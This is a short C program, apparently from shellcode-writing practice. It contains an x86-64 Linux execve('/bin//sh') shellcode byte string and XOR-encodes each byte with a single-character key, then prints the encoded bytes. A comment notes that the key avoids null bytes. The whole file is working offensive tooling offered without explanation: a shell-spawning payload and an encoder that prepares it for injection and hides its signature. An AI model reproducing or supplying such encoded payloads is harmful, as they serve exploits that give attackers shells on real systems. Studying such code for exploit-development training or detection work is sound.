#include <stdio.h>
#include <stdlib.h>

int main(int argc, char ** argv){
        char shellcode[]="\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";
        char key='S'; // Choose a key which is not in the shellcode to avoid null bytes
        int i=0;
        for (i=0;i<29;i++){
                shellcode[i] = shellcode[i]^key;
                printf("\\x%.2x", (shellcode[i]&0x000000ff));
        }
}
